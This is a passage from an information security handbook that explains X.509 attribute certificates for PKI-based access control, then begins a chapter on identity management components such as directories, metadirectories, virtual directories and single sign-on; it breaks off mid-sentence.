ExtensionValue=ObjectC3;
Continued

8  ◾  Information Security Management Handbook
Table 1.2  To Implement This Permission Control, the Privileged Clients Will Be Issued Appropriate ACs by the 
Authorities on the Sites To Which They Need Access (Continued)
AC Issued to
Client C2
Client A3
Client B2
Subject’s PKC
SubjectDN: cn=clientC2, 
ou=departmentC, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 13233343536373
SubjectDN: cn=clientA3, 
ou=departmentA, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 14243444546474
SubjectDN: cn=clientB2, 
ou=departmentB, o=acme, 
dc=com;
IssuerDN: cn=acmeCA, o=acme, 
c=us;
serialNumber: 15253545556575
Subject’s AC
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=13233343536373;
Attribute Type=siteA-Role 
Attribute Value=viewer;
Extension=AC Targeting
ExtensionValue=ObjectA2;
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=14243444546474;
Attribute Type=siteB-Role 
Attribute Value=contributor;
Extension=AC Targeting
ExtensionValue=ObjectB2;
Holder: IssuerDN: cn=acmeCA, 
o=acme, c=us + 
serialNumber=15253545556575;
Attribute Type=siteC-Role 
Attribute Value=viewer;
Extension=AC Targeting
ExtensionValue=ObjectC1;

Expanding PKI-Based Access Control Capabilities  ◾  9
contain attributes and extensions that can be used as authorization information, 
there are several reasons why in many cases it is not convenient to do so:
As in the example with passport and visa, the PKI/CA and the authoritative 
◾
◾
entity that grants authorization to access certain resources are often two dif-
ferent entities. So, separation of PKI/CA and AA is required.
Also as in the example with passport and visa, if a subject needs its privileges 
◾
◾
to be modified, it does not need its PKC to be reissued and redistributed, 
with all the sometimes-troublesome consequences that result for relying 
parties. It simply requests a new AC for that new or modified privilege. 
Likewise, when one of a subject’s privileges expires or needs to be revoked, 
the process will apply only to the corresponding AC rather than to the 
subject’s PKC.
Generally speaking, the AC can be used independently of PKC. Such may 
◾
◾
be the case for authentication-agnostic systems. For example, access control 
systems with userID/password authentication can pull the object’s AC from 
the LDAP to make the permissions control decisions. An LDAP search for 
the AC can be based on the subject’s DN. Because of the flexibility provided 
by the AC’s “holder” attribute (in the form of GeneralName), the identifiers 
used by the authentication system can be matched with a “holder” attribute 
of the AC.
The most comprehensive information about AC can be found in [RFC3281]. 
The attributes in the AC may be of different types, including any authorization 
information, group membership, role, assigned security level, or others. The rela-
tionship between X509.v3 PKC and X509 AC is described in Table 1.3, which is 
based on the RFC 3281 and RFC 3280 [RFC3280].
SITEA
ClientA1
ClientA2
ClientA3
ClientB1
ClientC1
ClientC2
ClientB2
ClientB3
LDAP A
LDAP B
AC Signer A
AC Signer B
Attribute Authority A
Attribute Authority B
Veriﬁer A
LDAP C
AC Signer C
Attribute Authority C
Veriﬁer C
Veriﬁer B
Object
A1
Object
C1
Object
C2
Object
C3
Object
A2
Object
B1
Object
B2
Gateway
H:A1;
ReviewC;
T;C3
H:A3;
R:contribB;
T;B2
HUB
PKI CA
LDAP
Gateway
Gateway
Gateway
H:B1;
R:contribA
T:A2
H:C1;
R:contribB
T:B2
H:B2;
R:viewC;
T:C1
H:C2;
R:viewA;
T:A2
SITEB
SITEC
In the Attribute
Certiﬁcates:
H = Holder;
R = Role;
T = Target
Figure 1.2  Hub and spoke access with attribute certificates. Sites contain objects 
and clients. Clients may be assigned the ACs.

10  ◾  Information Security Management Handbook
The important points to be made are these:
	
1.	The link between PKC and AC: To use an AC in an access control system, 
the access request should be able to ensure a link between the AC holder and 
the PKC subject. In other words, it is necessary to ensure that the attribute 
certificate belongs to the subject that authenticated itself with PKC and its 
digital signature. In the X.509 AC definition, this link is provided by the 
attribute “Holder”:
Table 1.3  The Relationship between X509.v3 PKC and X509 AC, Which Is 
Based on the RFC 3281 [RFC3281] and RFC 3280 [RFC3280]
PKC (RFC 3280)
AC (RFC 3281)
Certificate ::= SEQUENCE {
tbsCertificate TBSCertificate,
signatureAlgorithm 
AlgorithmIdentifier,
signatureValue BIT STRING }
TBSCertificate ::= SEQUENCE {
version [0] EXPLICIT Version DEFAULT 
v1,
serialNumber 
CertificateSerialNumber,
signature AlgorithmIdentifier,
issuer Name,
validity Validity,
subject Name,
subjectPublicKeyInfo 
SubjectPublicKeyInfo,
issuerUniqueID [1] IMPLICIT 
UniqueIdentifier OPTIONAL,
— If present, version shall be v2 or v3
subjectUniqueID [2] IMPLICIT 
UniqueIdentifier OPTIONAL,
— If present, version shall be v2 or v3
extensions [3] EXPLICIT Extensions 
OPTIONAL
— If present, version shall be v3
}
AttributeCertificate ::= SEQUENCE {
acinfo AttributeCertificateInfo,
signatureAlgorithm 
AlgorithmIdentifier,
signatureValue BIT STRING }
AttributeCertificateInfo ::= 
SEQUENCE {
version AttCertVersion — version v2,
holder Holder,
issuer AttCertIssuer,
signature AlgorithmIdentifier,
serialNumber 
CertificateSerialNumber,
attrCertValidityPeriod 
AttCertValidityPeriod,
attributes SEQUENCE OF Attribute,
issuerUniqueID UniqueIdentifier 
OPTIONAL,
extensions Extensions OPTIONAL
}

Expanding PKI-Based Access Control Capabilities  ◾  11
	
Holder ::= SEQUENCE {
	
	
baseCertificateID [0] IssuerSerial OPTIONAL,
	
	
	
— the issuer and serial number of the  
	
	
	
holder’s public key certificate
	
	
entityName [1] GeneralNames OPTIONAL,
	
	
	
— the name of the claimant or role
	
	
objectDigestInfo [2] ObjectDigestInfo OPTIONAL
	
	
	
— used to authenticate the holder 
	
	
	
directly, for example, an executable
	
}
	
ObjectDigestInfo ::= SEQUENCE {
	
	
digestedObjectType ENUMERATED {
	
	
	
publicKey (0),
	
	
	
publicKeyCert (1),
	
	
	
otherObjectTypes (2) },
	
	
	
	
— otherObjectTypes MUST NOT be used 
	
	
	
	
in this profile
	
	
otherObjectTypeID OBJECT IDENTIFIER OPTIONAL,
	
	
digestAlgorithm AlgorithmIdentifier,
	
	
objectDigest BIT STRING
	
}
	
This snap-in [RFC3281] shows how the AC holder and PKC subject can be 
uniquely linked through the baseCertificateID attribute (the unique com-
bination of the PKC issuer name and the PKC serial number). Another way 
to link AC to the subject is through use of the entityName. Because of the 
flexibility of GeneralName, the entityName attribute can be useful in access 
control systems both with PKC authentication (in which case it should match 
the PKC’s subject or subjectAltName) and with non-PKC authentication sys-
tems (e.g., Kerberos or Password).
	
	
Using objectDigestInfo as an AC’s holder identifier provides even more 
flexibility. In this case, the holder is identified by the hash. For example, it 
allows the issuance of an AC that carries privileges associated with executa-
bles, with any object identifiers, or with their public keys.
	
	
In the case of PKC-based authentication, it is important to mention that 
because the AC is signed by the trusted AA, the link between AC’s holder and 
PKC’s subject is also trusted.
	
2.	PKC and AC are uniquely identifiable: Just as for each PKC, so for each 
AC the combination of its issuer (AttrCertIssuer) and serial number 
(CertificateSerialNumber) must be unique.
	
3.	AC and PKC X.509 have some common and unique extensions: Just like 
PKCs, ACs have extensions that primarily give information about the certifi-
cate itself (see Table 1.4). Some extensions in PKC and AC are the same, but 
some are not. Following is a list of several of those extensions that apply only 
to ACs:

12  ◾  Information Security Management Handbook
	
a.	 Audit identity: Helps to provide an audit trail that does not contain any 
record directly identifying an individual (holder). This feature is required 
for applications under data protection and privacy regulation.
	
b.	 No revocation: The indication that no revocation information for the AC 
will be available. Specifically for AC, this noncritical extension makes 
sense because very often the validity period of AC is short (compared 
to that of its PKC), and for many AC-relying applications, checking the 
AC’s CRL will not be required.
	
c.	 AC targeting: An indication that this AC should apply only to the speci-
fied target server or services.
	
4.	Certificate policies extensions: Both PKC and AC have certificate policies 
extensions, called respectively “certificate policies” (CP) and “attribute cer-
tificate policies” (ACP) extensions. They contain a sequence of one or more 
policy information terms. These terms indicate the policies that control how 
the certificates have been issued and how they can be used. If the extension 
is marked as critical, a relying party application must be able to interpret 
this extension positively; otherwise the certificate must be rejected. There 
is a little difference between the way CP and ACP extensions are managed 
and used by relying parties. For PKC this extension is described along with 
all other aspects of PKC [RFC3280], but for AC it is in a dedicated source 
[RFC4476], which was published long after RFC 3281.
	
5.	Examples of the AC’s attribute types: Some of the attributes types delivered 
by the attribute certificates rely on standards that link those attribute types to 
the attribute policy authorities.
	
a.	 The clearance attribute carries clearance information about the AC holder, 
which is associated with security labeling. A particular attribute policy 
Table 1.4 
PKC Extensions
AC Extensions
Authority key identifier
Audit identity
Subject key identifier
Target information
Key usage
Authority key identifier
Private key usage period
Authority information access
Certificate policies
CRL distribution point
Subject alternative name
No revocation
Issuer alternative names
Attribute certificate policies
Basic constraints
CRL distribution points

Expanding PKI-Based Access Control Capabilities  ◾  13
authority may have its own policy, but this attribute type will include 
classification (unmarked, unclassified, restricted, confidential, secret, 
topsecret) and may include additional security categories.
	
b.	 The service authentication information attribute is to identify the AC 
holder to the service and also may include additional authentication 
information for services and applications. This attribute may be used 
for legacy systems’ access credentials. It may include userID and pass-
word, which may be encrypted. It is usually associated with the AC 
targeting extension because the decryption of the attribute should be 
possible only by a targeted recipient; hence it should be encrypted with 
appropriate keys.
	
c.	 The group attribute holds the information about group membership.
	
d.	 The role attribute holds information about role allocation.
	
These and any other attributes are represented by a unique name associated 
with their OIDs and the values:
	
Attribute ::= SEQUENCE {type
	
	
AttributeType, values
	
	
SET OF AttributeValue — at least one value is  
	
	
required
	
}
	
AttributeType ::= OBJECT IDENTIFIER
	
AttributeValue ::= ANY DEFINED BY AttributeType
1.5  PMI and PKI
The main purpose of the AC is to support authorization functions, and the PKC 
in the access control applications are mostly used to support strong authentication. 
Therefore, despite a lot of similarity between AC and PKC, AC management is 
considered to be within the PMI framework, and PKC is within PKI.
Comparing PKC and AC, the main emphasis is on the fact that PKC binds 
a subject and its public key, whereas AC binds a holder with its attributes. When 
a PKI subscriber registers with PKI, the PKI CA does just that—it signs a bind-
ing between the subject (subscriber) and its public key. Different processes of PKI 
registration have been reviewed (Figure 1.3) [ISMHAG]. In most cases, the differ-
ences between methods of PKI registration boil down to the level of trust between 
subscribers (end entities) and PKI CA, and to the way that public/private keys are 
generated. The certificate-signing requests, key exchange, certificate delivery, and 
management in many PKI implementations take place in the framework of PKIX-
CMP [PKIXCMP].
When a subject applies for its AC, or the PMI AA issues AC based on another 
type of request (e.g., from an authorized submitter), different processes need to be 
in place. A PMI, which is concerned with authorization functions, includes an AA. 

14  ◾  Information Security Management Handbook
An AA signs a binding between the AC holder and the attributes assigned to that 
holder (Figure 1.3). PMI enrollment and the issuing AC may not require a proof of 
possession of the private key or even authentication with PMI. If a subject’s PKC 
is published in LDAP, the issuing ACs may not even require any actions on the 
subscriber’s part. An example of this scenario is shown in Figure 1.4.
It is important to mention that the CA signing the PKC and the AA signing the 
AC should be different entities. This rule may be enforced during the AC validation 
phase by validation of the AC issuer’s certificate’s basic constraints.
Initial Registration
Out of bound processes
(i.e., personal authentication, authorization,
veriﬁcation, etc.)
Request PKI functions and aquire CA public
key
(EE initialization)
Possible scenarios
EE/PKI messages:
Messages from PKI to EE are
always authenticated
Messages from EE to CA are
authenticated (uses
authentication and reference
codes from CA)
Messages from EE to CA are not
authenticated
Initialization of the initial registration starts at:
EE or
RA or
CA
Possible location of key generation:
EE or
RA or
CA
Conﬁrmation of successful certiﬁcation:
EE  conﬁrms successful receipt of the message,
indicating creation of the certiﬁcate
EE does not conﬁrm
EE
RA
CA
Key
generation
Certiﬁcate request
protected with IAK
Certiﬁcate
 request
CONFIRMATION
CERTIFICATE
REQUEST
CERTIFICATE
RESPONSE
Basic authenticated scheme
IAK
REF
IAK
REF
CA
EE
Key
generation
Centralized
scheme
CERTIFICATE
•
•
•
•
•
•
•
•
•
•
•
 
Figure 1.3  PKI registration. (Copyright © The Internet Society, 2009. All Rights 
Reserved. See NOTE, page 18.)

Expanding PKI-Based Access Control Capabilities  ◾  15
A more comprehensive example of using PMI to support RBAC may be found 
in [RBACX509]. PERMIS’s PMI helped to build a general-use RBAC using ACs. 
At the core of it is the privilege allocator, which is used by the AA to allocate privi-
leges to the users in the form of roles, because that PMI supports RBAC. The role 
is one of the predefined AC attribute types [RFC3281]. Essentially, the roles are 
represented in the ACs as a couple, namely, “attribute type”–“attribute value.” In 
the PERMIS example, one of the attribute types is “permisRole,” and its value may 
be “Map-Reader,” “Architect,” or others. According to those roles, the AC’s holders 
with the “Map-Reader” attribute can only download a map, whereas “Architect” is 
allowed both to download the maps and to upload modified maps.
Although both PKI/CA and PMI/AA publish the certificates’ revocation infor-
mation in their CRLs, the addresses of which are presented in the X509 certificate’s 
extension CRL distribution point, the AC’s revocation has its own specifics. The 
validity of ACs for many applications may be much shorter than the validity of their 
“anchor” PKC. It may be even shorter than the time usually required for processing 
a revocation request and issuing and publishing a CRL. For this category of short-
lived ACs, no revocation information will be published. This fact is communicated 
to relying parties via the AC’s extension noRevAvail (see Section 1.4).
The long-lived ACs do not have this extension, and the AA should support 
their revocation status. For a relying application, the address where the certifi-
cate revocation status is published is available via pointers in the AC’s extensions, 
crlDistributionPoint or authorityInfoAccess.
1.6  AC Validation
Although AC validation includes most of the steps for PKC validation, there are 
some specifics:
Permission Management
Authority
Attribute Authority A
(Issues and signs
policy and
attribute Certiﬁcates)  
Request to Issue AC
“role=Contributor A” to the
Client B1
Authorized Submitter A
LDAP A
Verify that AC of B1 has a
“contributor” role targeted
the Object A1
Verify PKC B1 for
Authentication
Client B1 requests access to the Object A1
Client B1
Gateway A
Verify that AC of B1
allows access to
the site A
Object A1
Find Holder’s PKC for the
Client B1
Publish Holder’s AC
Publish AC CRL
Figure 1.4  Issuing and publishing AC. Example for Client B1 accessing Object A1.

16  ◾  Information Security Management Handbook
AC validation follows the authentication phase of access control. If AC is 
◾
◾
used in the access control with PKC authentication, the PKC must be verified 
first. If other authentication methods are in use, an appropriate link should be 
verified. As described previously, the flexible schemes of the holder attribute 
make it possible to link the AC to a holder’s identity used by an authentica-
tion scheme or to its hash.
AC issuer’s profile must satisfy the following criteria:
◾
◾
Its key usage should be allowed for signature validation.
−
−
It should not be a PKC authority’s certificate.
−
−
Optionally, there may be extensions in the AC issuer PKC that indicate 
−
−
for which specific attributes this issuer can sign the ACs and for which 
it cannot.
The AC targeting extension (described earlier) should correspond to the 
◾
◾
application.
Other validation steps are similar to those used for PKC validation [RFC3280]:
AC signature should be verified. The AC issuer should be a trusted authority, 
◾
◾
and its certificate must be trusted by the application.
AC validity period will be verified the same way as is done for PKC.
◾
◾
Revocation status of AC, as well as PKC, is verified based on the CRL distri-
◾
◾
bution point information, either by “pulling” CRL from LDAP or by using 
OCSP. However, there is the extension, noRevAvail, which indicates that no 
revocation information will be available for the AC. This provides a practical 
solution for ACs with a short validity time span.
1.7  Putting It All Together
In this section, we will review the use case with access control combining PKI 
and PMI.
Although there is a hierarchical PKI with subordinate CAs on the spoke sites, 
we will simplify the case and consider all the PKCs issued by the central root CA to 
be trusted by all applications on all sites.
As presented in Figure 1.3, there is a PKI/CA on the central hub that issues 
◾
◾
and publishes PKCs for other components of the infrastructure, for applica-
tions, and for servers and clients. All certificates and CRLs issued by this 
PKI/CA are published in the central LDAP directory.
Each site has its own AA, which assigns privilege attributes to those end 
◾
◾
entities that need to get access to the resources on that site. Assigning the 
attributes is followed by issuing and signing ACs and publishing them in the 

Expanding PKI-Based Access Control Capabilities  ◾  17
local LDAP directory, which may be in a replica–master relationship with the 
central directory in the hub.
Registration of each end entity and obtaining access permission includes the 
following steps:
End entity registers with central PKI.
◾
◾
Central PKI/CA issues the public key certificate.
◾
◾
As shown in Figure 1.3, an authorized submitter requests for that entity the 
◾
◾
privileges to access certain resources on a certain site.
Each site’s permissions management authority allocates permissions and 
◾
◾
roles. The AA then issues, signs, and publishes the end entity’s ACs. Each AC 
is bound to the holder by its PKC unique attributes.
The following steps occur when the end entity is trying to access required 
resources on that site (see Figure 1.4):
It authenticates with its PKC on the site’s gateway.
◾
◾
The gateway receives all the client’s AC’s. Depending on the implemented 
◾
◾
model, either the gateway “pulls” from the LDAP directory all the ACs of the 
end entity or the end entity “pushes” them to the gateway.
Access to the site is granted if the client has the site access permission attribute or 
◾◾
the appropriate clearance attribute certificates, and if those certificates are valid.
Each resource accessed by the client will validate the client’s AC (see Section 
◾◾
1.6).
Each site is capable of managing access privileges for all resources on the site, to 
grant or revoke them independently of the status of the central PKI/CA.
This use case may have many variations. For example, in a VPN community 
built as a “star” topology to support trading partners, each site fully controls privi-
leges granted to its own and partners’ subjects to access objects/resources on that 
site. Another example is a data distribution hub, which should control who can send 
particular data to whom, and who is allowed to receive particular data from whom.
1.8  Conclusions
Using attribute certificates helps significantly to enhance applications’ PKI-based 
access control. Separation of authentication credentials and privilege attributes, and 
managing them via PKI and PMI respectively, allows the creation of more manage-
able and more flexible access control. In many situations, the business and trust 
models may require this separation. The AC templates allow a very flexible way of 
linking the AC to the holder’s identity. This is important when access control has 

18  ◾  Information Security Management Handbook
to accommodate different authentication schemas, both PKC-based and others. 
Although both PKC and AC serve different purposes and have their own specific 
attributes and extensions, the management of both types of certificates has a lot 
of common functions in the way the certificates are signed by authorities, the way 
they are revoked, and the way they are validated. The same framework can be used 
for both types of certificates.
References
[ISMHAG] Alex Golod, PKI registration, in Information Security Management Handbook, H. 
Tipton and M. Krause, Eds., Auerbach Publications, 2003.
[PERMIS] PrivilEge and Role Management Infrastructure Standards, http://www.permis.org.
[PKIXCMP] C. Adams, S. Farrell, Internet X.509 Public Key Infrastructure. Certificate 
Management Protocols, RFC 2510, March 1999.
[RBACX509] D. Chadwick, A. Otenko, E. Ball, Implementing Role Based Access 
Controls Using X.509 Attribute Certificates—The PERMIS Privilege Management 
Infrastructure, http://sec.cs.kent.ac.uk/download/InternetComputingPaperv4.pdf.
[RFC3280] R. Housley, W. Polk, W. Ford, D. Solo, Internet X.509 Public Key Infrastructure 
Certificate and Certificate Revocation List (CRL) Profile, RFC 3280, 2002.
[RFC3281] S. Farrell, R. Housley, An Internet Attribute Certificate Profile for Authorization, 
RFC 3281, April 2002.
[RFC4212] M. Blinov, C. Adams, Alternative Certificate Formats for the Public-Key 
Infrastructure Using X.509 (PKIX) Certificate Management Protocol, RFC 4212, 
October 2005.
[RFC4476] C. Francis, D. Pinkas, Attribute Certificate (AC) Policies Extension, RFC 4476, 
May 2006.
[SESAME] Secure European System for Applications in Multi-vendor Environment, 
https://www.cosic.esat.kuleuven.be/sesame/html/sesame_what.html.
Note
This document and translations of it may be copied and furnished to others, and 
derivative works that comment on or otherwise explain it or assist in its implmen-
tation may be prepared, copied, published and distributed, in whole or in part, 
without restriction of any kind, provided that the above copyright notice and this 
paragraph are included on all such copies and derivative works. However, this doc-
ument itself may not be modified in any way, such as by removing the copyright 
notice or references to the Internet Society or other Internet organizations, except 
as needed for the purpose of developing Internet standards in which case the pro-
cedures for copyrights defined in the Internet Standards process must be followed, 
or as required to translate it into languages other than English.
The limited permissions granted above are perpetual and will not be revoked by the 
Internet Society or its successors or assigns.

19
2
Chapter 
Five Components to 
Identity Management 
Systems
Kevin Castellow
2.1  Introduction
This chapter defines five major components of an identity management (IdM) 
system. It introduces each part and describes what a scenario looks like when 
this option may be appropriate for the situation. From there, each component is 
described from a generic view of the market options that are available. Table 2.1 
displays common problems and the identity management approach to the solution 
for each problem.
These statements signal a need for expanding or implementing an identity man-
agement system. An IdM system is typically defined as the ability to create subjects, 
Contents
2.1	 Introduction................................................................................................19
2.2	 First Component.........................................................................................21
2.3	 Second Component.....................................................................................23
2.4	 Third Component.......................................................................................25
2.5	 Fourth Component.....................................................................................27
2.6	 Fifth Component........................................................................................29
2.7	 Conclusions.................................................................................................30

20  ◾  Information Security Management Handbook
manage attributes of the subjects, and remove the subjects in a predefined flow. 
However, IdM has evolved to include more than add, modify, and delete capabilities 
of users or resources. In today’s highly regulated environments, IdM also includes 
the need for other items like auditing, certification of users, and shared sessioning.
This chapter will define IdM as the system that provides the foundation for sub-
jects, whether a user or another system, to manage the addition, modification, and 
deletion process in a secure, repeatable flow while reducing data repetition through-
out the system. The goal of a successful IdM system should allow existing and new 
applications a foundation of repeatable, easily accessible identity data appropriately 
controlled by access controls and auditing.
Table 2.1  General Indicators for Identity Management Components
Symptoms
Solution
Too many directories with the same 
user information.
Virtual directory or metadirectory
It is impossible to see who has access 
to which resources.
Delegated administration
End users complain of too many 
passwords.
SSO solution
Application development teams are 
forced to build new access controls 
for each application.
SSO solution
User information is stored in the 
same database as order information.
User directory
The IT Department can’t keep up 
with requests to change permissions.
Delegated administration
There are accounts that are still 
enabled for people who no longer 
work at this company.
Delegated administration
It can take weeks to set up the 
permissions correctly for a new hire’s 
account.
Provisioning
Users have no way to recover a lost 
password without calling the help 
desk.
Provisioning/delegated 
administration
Data owners do not want to give up 
control of their data to another group 
to manage.
Virtual directory

Five Components to Identity Management Systems  ◾  21
The five components are
	
1.	A directory
	
2.	Directory integration
	
3.	Access control
	
4.	Delegated administration
	
5.	Provisioning
It is not necessary to have all five components for success. Each one has its own use 
and every enterprise is at a different state of need. In today’s software market, some 
of these components bleed into other areas of functionality, which only makes the 
decision that much more difficult when determining a solution and the appropriate 
time to implement it.
2.2  First Component
The directory is the first and likely the most important component in this system. 
It is not difficult to say that a directory is necessary because in most cases there are 
too many directories in place. This causes the staff to spend time managing direc-
tories that store the same data in multiple locations. What data does the directory 
store? The directory is the repository of data that describes the user of the system. 
Additionally, the directory may store metadata about the applications.
It is important to point out that in most technical discussions the term “direc-
tory” specifically describes an LDAP directory store. In this case, that is not 
completely accurate. Although it may be more common to use LDAP for user 
information, a relational database may also be utilized as the user directory. The 
tree structure of an LDAP was designed and optimized for fast lookups to find 
a user in a large system. However, relational databases were better for data that 
changed frequently and data that had to provide atomicity, consistency, isolation, 
and durability (ACID).
LDAP is typically deployed among many servers. The data structure within 
LDAP allows for data to be broken up into specific parts and distributed among 
many LDAP servers on a network. These servers can be dedicated for read requests 
or allocated specifically for update/write requests. All of the servers can then be rep-
licated for maximum data availability. LDAP historically had advantages because it 
allowed for client interaction without the installation of additional driver software.
As mentioned earlier, versions of LDAP directories had a weakness of being 
very slow to handle an update request for data. This weakness has been corrected by 
dedicating one or multiple servers specifically for handling updates. This segregated 
the slower, more intensive requests to specific machines. This capability allowed 
architects to tune these specific machines further to handle the updates. Today, 

22  ◾  Information Security Management Handbook
many manufacturers are modifying the LDAP software to handle the updates bet-
ter right from the beginning with no tuning or redesign necessary.
The second issue is the lack of ACID transactions. To reiterate, this issue was 
more of a problem in past versions of directory software, but it is important to 
mention. Whereas relational databases were designed to handle large amounts of 
updates quickly, it ensures that if one transaction updates three tables and one 
update fails, the entire transaction will fail and revert back to the original state. 
LDAP servers could leave information in a state where two of the three pieces of 
information were updated and the third failed. Depending on the manufacturer 
and version of the directory software, this should always be something to be aware 
of when working with LDAP. Additionally, the standard matured in this area to 
add greater atomic controls (refer specifically to RFC 4525, 4527, and 4528). Most 
of these RFCs were updated in 2006, and it should be expected that these capabili-
ties would be present in any new version of LDAP software.
Relational databases can be used to store user information. Many projects 
already utilize the relational database capabilities because a database is almost 
always necessary for a transactional application to run. Once the database is in 
place, it seems logical to insert user data into its own table along with application 
data. This is generally why user data is found in a relational database that also 
stores the application data. It is convenient, the database administrator is already 
hired and in place, and the software for the relational database has already been 
purchased. Why not use it?
As mentioned earlier, a relational database does have its advantages. The database 
supports transactions that are guaranteed or else the entire request is rolled back. 
The speed can be easily tuned for different types of lookups and update requests. 
However, one drawback to the relational database is not necessarily related specifi-
cally to identity management, but the difference between relational tables and the 
tree structure of LDAP. If it was necessary to add a new column to a relational 
database, this could be difficult to modify. The difficulty could come from adding 
new relationships to additional tables, possibly modifying the space allocation for 
the table. In general, the relational database is best managed if it is designed right 
from the beginning with very little changes to the design as it matures. LDAP has 
the ease of adding attributes, and they can be inherited without much issue to any 
other data.
Second, LDAP has a more natural way to break data apart. It is fairly easy to 
split data based on attribute values. As an example, all West Coast requests could 
be handled by referrals to the West Coast directory server. This is difficult for a rela-
tional database to handle without replicating the entire table between all servers.
Finally, when referring to the directory in an IdM project, do not assume that it 
is an LDAP server. A directory is the first step to an IdM system. It is not unusual 
to have many of these user directories across an enterprise because each application 
typically was responsible for signing up its own users and maintaining the user’s 
ability to use the application.

Five Components to Identity Management Systems  ◾  23
The growth of these directories has now caused an enterprise problem where 
more components are created to handle the issue of having many directory stores 
with duplicate data or disparate data that needs to be combined and used in differ-
ent combinations with newer applications.
2.3  Second Component
The growth of the user directories created the opportunity for metadirectories and 
virtual directories. These are the components that begin to tie together the dispa-
rate systems. Deciding which one is correct for each environment usually involves 
understanding the political landscape of the company.
Metadirectories (Figure 2.1) are usually LDAP-compliant servers that provide 
a central hub for information to flow to and from. Typically, vendors build the 
metadirectories with their LDAP server as the underlying data store. It is impor-
tant to understand that a metadirectory will create an additional directory in the 
enterprise. Metadirectories usually have the capabilities to synchronize data across 
multiple application repositories, as well as modifying the data as it is in transit. 
The metadirectory acts as the middleware piece for all directories and relational 
databases attached to it. Implementing a metadirectory requires knowledge of each 
downstream identity directory and its data. The work in the metadirectory is done 
first in the documentation of the data it will manage. If two different servers each 
store a user’s address, but both servers have different information, it will be up to the 
rules defined in the metadirectory to decide which one has precedence. Defining 
the rules can be time consuming. Additionally, the downstream directory servers 
Metadirectory
Source of Record
Identity
Store 
A
Identity
Store 
B
Identity
Store 
C
Figure 2.1  The metadirectory acts as the synchronization device for all directo-
ries attached.

24  ◾  Information Security Management Handbook
and relational databases are not replaced by the metadirectory. The metadirectory 
becomes the source for all changes and manages the data to make sure it stays in 
sync across the enterprise. The metadirectory can begin to add more rollback capa-
bilities and error handling in case one server is down, but it needs to be updated. 
The metadirectory can try an update at a later point in case of an error or unsched-
uled downtime for the user directory.
The negative part of the metadirectory usually starts to materialize in the poli-
tics of the company. The metadirectory now controls the user data in any connected 
server. Existing applications and the management teams around those applications 
usually have trouble with another team managing the data they require for day-to-
day operations. This is the politics of identity management. To implement a metadi-
rectory for a large enterprise usually requires high-level support from management. 
Hopefully, all the integrating user directories will be required to participate. If one 
or two existing applications fail to participate or refuse to allow the connectiv-
ity, it can drastically reduce the value of the metadirectory. Imagine spending the 
money and the time to map the data, but still having rogue applications that refuse 
to provide their data to the metadirectory. Getting 100 percent participation and 
managing the data as new applications come online is critical to maintaining the 
value of the metadirectory to the enterprise.
Virtual directories (Figure 2.2) are slightly different from metadirectories. 
They were created to work within the political boundaries that are so often the 
cause of metadirectory problems. Virtual directories still make all the same 
connections and provide data manipulation of the data very similar to meta-
directories. The main difference is the virtual directory holds no data. The 
data continues to reside in its original home with each application. The virtual 
directory provides mappings to the data and its location, but presents it as one 
Virtual
Directory
Identity
Store 
A
Identity
Store 
B
Identity
Store 
C
Figure 2.2  The virtual directory provides an aggregated view of data for appli-
cations and maintains the original identity stores as the source of record for 
identity data.

Five Components to Identity Management Systems  ◾  25
identity directory to the requesting client. Virtual directories are not interested 
in replicating the data into one large set that then synchronizes across the enter-
prise. Instead, virtual directories are more like pointers to the data. This concept 
seems to ease the pain and allows for more cooperation from the data owners. 
They know they will still own their data and are responsible for the manage-
ment of the same data. They will not lose the power they worked so hard to get 
in the first place. With the virtual directory, they probably gain more attention 
because more applications will now have access to the data that was previously 
reserved for applications that the department managed. That is the primary 
difference between virtual and metadirectories. It seems like a slight difference, 
but in the enterprise it is difficult to navigate around human emotions and poli-
tics. The virtual directory is typically an easier sell to participating groups than 
the metadirectory.
2.4  Third Component
The third component, which can exist without the use of a metadirectory or vir-
tual directory, is the access control piece. Access controls depend on an identity 
directory to work. Access controls can be implemented with many different fla-
vors. Some standard software-based access controls are basic authentication, digest 
authentication, and forms-based authentication. These access controls are based on 
username/password combinations.
Basic authentication is not secure and does not encrypt the username/password 
provided by the client to the server for authentication. The information is simply 
encoded for transit. Typically, this type of control is not useful in today’s highly 
regulated environments; although if it is combined with Secure Sockets Layer (SSL) 
communication, the username/password combo is protected while in transit.
Digest authentication is a variant of basic authentication. This process protects 
the username/password combination in transit without requiring the use of SSL. 
The username/password and a predefined realm are used to create a digest with a 
nonce provided by the server. The digest is passed from the client to the server, and 
each time, the server additionally numbers the sequence of messages further to 
prevent replay-type attacks.
Form-based authentication is a way for developers to customize their own look 
and feel for a log-in page. The page itself can use the logic provided by the develop-
ers. This has become more standardized with the adoption of predefined code snip-
pets that are widely available in Java and .Net programming languages. In many 
instances, creating a form is as simple as dragging and dropping it onto a page.
Access controls can be based on hardware devices. Probably the most recog-
nizable is the key fob with the six-digit random number generator. The key fob is 
synchronized with the server side management software. The username/password 

26  ◾  Information Security Management Handbook
is combined with the random number to create a combination of something users 
have in their possession with something they know, like the password.
Other hardware-based access controls are based on smart cards, fingerprints, 
retina scans, or possibly, handwriting samples. They all work on the same principle 
of providing the important combination of something you possess with something 
only the user should know.
Although the previously mentioned options fall under the access control 
umbrella, there are many other options that exist as well. Single sign-on (SSO) sys-
tems are usually represented here and provide integration between applications and 
access control devices. Single sign-on is usually an option selected if the enterprise 
has problems managing the different types of access controls or wants to provide 
a more cohesive experience between different applications. SSO systems can be 
viewed from two perspectives. The first is how SSO is able to provide the single 
session experience between multiple applications. This is the benefit from the user 
perspective. The user is given a session after authentication is successful. A ses-
sion token is usually placed in a cookie if the application is browser based. The 
cookie allows the user to move from application to application without the need for 
reauthentication. From the perspective of the user directories, SSO is able to pro-
vide some of the capabilities that a metadirectory or virtual directory may provide. 
However, it is usually not as flexible—generally having fewer options. The SSO 
server needs to know where to look or how to authorize the user for each URL that 
is requested. This data could be synchronized into a main SSO identity store or it 
may be provided in multiple locations that the SSO server is required to look up 
based on each request from the user. In any case, most SSO systems have caching, 
failover, shared session servers, and Web service based options. SSO is a mature 
design component and is essential to at least reducing the number of passwords a 
user may have to memorize even though the goal is to have a single password. Many 
times achieving the single password goal is just not practical because the enterprise 
